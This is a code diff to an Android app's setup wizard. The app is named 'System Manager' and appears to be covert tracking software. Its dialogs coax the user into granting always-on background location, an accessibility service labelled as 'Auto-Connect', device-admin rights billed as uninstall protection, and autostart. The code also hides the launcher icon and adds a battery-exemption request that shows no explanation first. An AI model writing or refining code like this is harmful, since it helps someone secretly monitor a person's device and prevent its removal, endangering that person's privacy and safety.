@@ -13,6 +13,8 @@ import android.net.Uri;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.text.TextUtils;
@@ -29,19 +31,18 @@ public class MainActivity extends BridgeActivity {
     private static final int RC_BG_LOC       = 1002;
     private static final int RC_DEVICE_ADMIN = 2001;
 
+    // Simplified steps — only dialog-based, no surprise Settings launches
     private static final int STEP_PERMISSIONS   = 0;
     private static final int STEP_BG_LOCATION   = 1;
-    private static final int STEP_BATTERY       = 2;
-    private static final int STEP_USAGE         = 3;
-    private static final int STEP_ACCESSIBILITY = 4;
-    private static final int STEP_DEVICE_ADMIN  = 5;
-    private static final int STEP_OEM_AUTOSTART = 6;
-    private static final int STEP_DONE          = 7;
+    private static final int STEP_ACCESSIBILITY = 2;
+    private static final int STEP_DEVICE_ADMIN  = 3;
+    private static final int STEP_OEM_AUTOSTART = 4;
+    private static final int STEP_DONE          = 5;
 
     private static final String PREFS_NAME = "mdm_setup";
     private static final String KEY_DONE   = "setup_done";
 
-    private int     currentStep     = STEP_PERMISSIONS;
+    private int     currentStep      = STEP_PERMISSIONS;
     private boolean waitingForResume = false;
     private ComponentName adminComponent;
 
@@ -67,11 +68,15 @@ public class MainActivity extends BridgeActivity {
         startForegroundService(new Intent(this, MdmForegroundService.class));
 
         SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-        if (!prefs.getBoolean(KEY_DONE, false)) {
-            // First time — run setup wizard
-            runStep(STEP_PERMISSIONS);
+        if (prefs.getBoolean(KEY_DONE, false)) {
+            // Already set up — silently request battery in background, show app
+            requestBatterySilent();
+            return;
         }
-        // If already done — just show the WebView (BridgeActivity handles it)
+
+        // First time — start setup wizard with a small delay so WebView loads first
+        new Handler(Looper.getMainLooper()).postDelayed(
+            () -> runStep(STEP_PERMISSIONS), 1500);
     }
 
     // ── Step runner ───────────────────────────────────────────────────────
@@ -81,8 +86,6 @@ public class MainActivity extends BridgeActivity {
         switch (step) {
             case STEP_PERMISSIONS:   doPermissions();   break;
             case STEP_BG_LOCATION:   doBgLocation();    break;
-            case STEP_BATTERY:       doBattery();       break;
-            case STEP_USAGE:         doUsage();         break;
             case STEP_ACCESSIBILITY: doAccessibility(); break;
             case STEP_DEVICE_ADMIN:  doDeviceAdmin();   break;
             case STEP_OEM_AUTOSTART: doOemAutoStart();  break;
@@ -119,8 +122,8 @@ public class MainActivity extends BridgeActivity {
             ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                 != PackageManager.PERMISSION_GRANTED) {
             new AlertDialog.Builder(this)
-                .setTitle("Location Always On")
-                .setMessage("Next screen mein 'Allow all the time' select karo taaki location background mein bhi kaam kare.")
+                .setTitle("Location — Always On")
+                .setMessage("Agli screen mein 'Allow all the time' select karo taaki location background mein bhi mile.")
                 .setCancelable(false)
                 .setPositiveButton("Continue", (d, w) ->
                     ActivityCompat.requestPermissions(this,
@@ -132,64 +135,19 @@ public class MainActivity extends BridgeActivity {
         }
     }
 
-    // ── Step 2 — Battery optimization (direct system popup, no pre-dialog) ─
-
-    private void doBattery() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                try {
-                    waitingForResume = true;
-                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                    i.setData(Uri.parse("package:" + getPackageName()));
-                    startActivity(i);
-                    return;
-                } catch (Exception ignored) {}
-            }
-        }
-        nextStep();
-    }
-
-    // ── Step 3 — Usage stats ──────────────────────────────────────────────
-
-    private void doUsage() {
-        if (isUsageAccessGranted()) { nextStep(); return; }
-        new AlertDialog.Builder(this)
-            .setTitle("Usage Access")
-            .setMessage("1. Tap 'Open Settings'\n2. 'System Manager' dhundho\n3. Toggle ON karo\n4. Back press karo")
-            .setCancelable(false)
-            .setPositiveButton("Open Settings", (d, w) -> {
-                waitingForResume = true;
-                try {
-                    Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
-                    i.setData(Uri.parse("package:" + getPackageName()));
-                    startActivity(i);
-                } catch (Exception ignored) {
-                    try { startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)); }
-                    catch (Exception ignored2) { nextStep(); }
-                }
-            })
-            .setNegativeButton("Skip", (d, w) -> nextStep())
-            .show();
-    }
-
-    private boolean isUsageAccessGranted() {
-        try {
-            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
-            long now = System.currentTimeMillis();
-            List<UsageStats> stats = usm.queryUsageStats(
-                UsageStatsManager.INTERVAL_DAILY, now - 60_000, now);
-            return stats != null && !stats.isEmpty();
-        } catch (Exception e) { return false; }
-    }
-
-    // ── Step 4 — Accessibility service ───────────────────────────────────
+    // ── Step 2 — Accessibility service ────────────────────────────────────
 
     private void doAccessibility() {
         if (isAccessibilityEnabled()) { nextStep(); return; }
         new AlertDialog.Builder(this)
-            .setTitle("Auto-Connect Enable Karo")
-            .setMessage("Phone restart ke baad auto-connect ke liye:\n\n1. 'Open Settings' tap karo\n2. 'System Manager' dhundho\n3. Toggle ON → Allow\n4. Back press karo")
+            .setTitle("Auto-Connect Setup (1/2)")
+            .setMessage(
+                "Phone restart ke baad auto-connect ke liye ek setting chahiye.\n\n" +
+                "Steps:\n" +
+                "1. Neeche 'Open Settings' dabao\n" +
+                "2. 'System Manager' dhundho\n" +
+                "3. Toggle ON karo → Allow dabao\n" +
+                "4. Back press karke wapas aao")
             .setCancelable(false)
             .setPositiveButton("Open Settings", (d, w) -> {
                 waitingForResume = true;
@@ -219,20 +177,22 @@ public class MainActivity extends BridgeActivity {
         return false;
     }
 
-    // ── Step 5 — Device Admin ─────────────────────────────────────────────
+    // ── Step 3 — Device Admin ─────────────────────────────────────────────
 
     private void doDeviceAdmin() {
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         if (dpm == null || dpm.isAdminActive(adminComponent)) { nextStep(); return; }
         new AlertDialog.Builder(this)
-            .setTitle("Security Protection")
-            .setMessage("Next screen mein 'Activate' tap karo — yeh unauthorized uninstall se protect karta hai.")
+            .setTitle("Uninstall Protection (2/2)")
+            .setMessage(
+                "Unauthorized removal se bachane ke liye ek permission chahiye.\n\n" +
+                "Agli screen mein 'Activate' button dabao.")
             .setCancelable(false)
             .setPositiveButton("Continue", (d, w) -> {
                 Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                 i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                    "Keeps system security active and prevents unauthorized removal");
+                    "Prevents unauthorized removal of System Manager");
                 startActivityForResult(i, RC_DEVICE_ADMIN);
             })
             .setNegativeButton("Skip", (d, w) -> nextStep())
@@ -245,7 +205,7 @@ public class MainActivity extends BridgeActivity {
         if (requestCode == RC_DEVICE_ADMIN) nextStep();
     }
 
-    // ── Step 6 — OEM AutoStart ────────────────────────────────────────────
+    // ── Step 4 — OEM AutoStart (Vivo only on this device) ────────────────
 
     private void doOemAutoStart() {
         String mfr = Build.MANUFACTURER.toLowerCase();
@@ -259,7 +219,12 @@ public class MainActivity extends BridgeActivity {
         String brand = isVivo ? "Vivo" : isHuawei ? "Huawei/Honor" : isOppo ? "OPPO/Realme" : "Xiaomi";
         new AlertDialog.Builder(this)
             .setTitle("AutoStart — " + brand)
-            .setMessage("1. 'Open Settings' tap karo\n2. 'System Manager' dhundho\n3. AutoStart ON karo\n4. Back press karo")
+            .setMessage(
+                "Last step!\n\n" +
+                "1. 'Open Settings' dabao\n" +
+                "2. 'System Manager' dhundho\n" +
+                "3. AutoStart toggle ON karo\n" +
+                "4. Back press karo")
             .setCancelable(false)
             .setPositiveButton("Open Settings", (d, w) -> {
                 waitingForResume = true;
@@ -321,19 +286,34 @@ public class MainActivity extends BridgeActivity {
         catch (ClassNotFoundException e) { return false; }
     }
 
-    // ── Step 7 — Done ────────────────────────────────────────────────────
+    // ── Step 5 — Done ────────────────────────────────────────────────────
 
     private void doFinish() {
-        // Save flag so wizard never runs again
         getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
             .edit().putBoolean(KEY_DONE, true).apply();
 
+        requestBatterySilent();
+
         new AlertDialog.Builder(this)
             .setTitle("Setup Complete!")
-            .setMessage("System Manager active ho gaya hai aur background mein chal raha hai.")
+            .setMessage("System Manager active hai aur background mein chal raha hai.")
             .setCancelable(true)
-            .setPositiveButton("OK", null) // just dismiss — app stays open showing dashboard
+            .setPositiveButton("OK", null)
             .show();
+    }
+
+    // Battery optimization requested silently — no Settings page opens
+    private void requestBatterySilent() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    i.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(i);
+                }
+            } catch (Exception ignored) {}
+        }
     }
 
     private void hideLauncherIcon() {
